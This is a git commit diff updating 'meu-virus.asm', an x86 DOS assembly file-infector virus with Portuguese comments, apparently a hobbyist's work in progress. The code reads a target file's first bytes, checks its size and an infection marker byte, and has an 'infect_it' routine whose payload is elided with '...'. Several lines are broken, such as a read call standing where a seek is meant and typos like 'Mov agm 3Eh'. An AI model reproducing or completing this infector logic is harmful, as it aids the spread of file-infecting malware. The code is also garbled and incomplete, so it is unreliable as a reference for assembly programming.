e30ea199095c4243478c638544e261cd49c3347b
DIEGO <diegocracker@gmail.com>
2023-03-03 14:35:35 -0300

    Update meu-virus.asm

--- meu-virus.asm
+++ meu-virus.asm
@@ -1,47 +1,68 @@
 	JE READ
 	JNE Diego_virus
+; Define os segmentos de código, dados e pilha
+.code
+org 100h
 
-codigo segment 'code'
+start:
+    ; Configura os segmentos de código e dados
+    mov ax, seg codigo
+    mov ds, ax
+    mov es, ax
 
-	org 100h 
+    ; Chama o procedimento falso_proc
+    call falso_proc
 
-	assume cs:codigo,ds:codigo,es:codigo
-	
-start proc far
-START:
-	push cs
-	push cs
-	
-	pop ds	
-	pop es
-	
-	call falso_proc
+    ; Configura o ponteiro da pilha
+    mov bp, sp
+    sub bp, 107h
 
-falso_proc 	proc near
-falso_proc  endp
+    ; Lê os três primeiros bytes do arquivo
+    mov ah, 3Fh
+    mov cx, 3
+    lea dx, [bp+offset buffer]
+    int 21h
 
-	pop bp
-	sub bp, 107h
-	
-	mov ah, 3Fh ;Leia os três primeiros
-mov 	cx, 3 ;bytes do arquivo
-lea	dx, [bp+offset buffer] ; buffer
-int 	21h
-mov 	ax, 4202h ;SEEK from EOF
-xor 	cx, cx ;DX:CX = offset
-xor 	dx, dx ;Retorna o tamanho do arquivo
-int 	21h ;in DX:AX
-Sub 	ax, virus_size + 3
-cmp 	word ptr [bp+offset buffer+1], ax
-jnz 	infect_it
-bomb_out:
-Mov 	agm 3Eh ;senao feche o arquivo
-Int 	21 ; e vá procurar outro
+    ; Obtém o tamanho do arquivo
+    mov ah, 3Fh
+    mov cx, 0
+    mov dx, -1
+    int 21h
 
-mov 	ah, 3Fh 
-mov 	cx, 4 
-lea 	dx, [bp+offset buffer]
-int 	21h
-cmp 	byte ptr [buffer+3],infection_id_byte;Check the fourth
-jz bomb_out
-Infect_it;
+    ; Calcula o tamanho do arquivo menos o tamanho do vírus e dos três primeiros bytes
+    sub ax, virus_size+3
+
+    ; Verifica se o tamanho do arquivo é igual ao tamanho esperado
+    cmp ax, word ptr [bp+offset buffer+1]
+    jne bomb_out
+
+    ; Lê o quarto byte do arquivo e verifica se já está infectado
+    mov ah, 3Fh
+    mov cx, 1
+    lea dx, [bp+offset buffer+3]
+    int 21h
+    cmp byte ptr [bp+offset buffer+3], infection_id_byte
+    je bomb_out
+
+infect_it:
+    ; Insere o código do vírus no arquivo
+    ...
+
+    ; Fecha o arquivo
+    mov ah, 3Eh
+    int 21h
+
+    ; Sai do programa
+    mov ah, 4Ch
+    int 21h
+
+falso_proc:
+    ret
+
+; Define as variáveis e constantes utilizadas
+codigo segment
+    buffer db 3 dup (0)
+    virus_size equ $-start
+    infection_id_byte db 0x12
+codigo ends
+end start
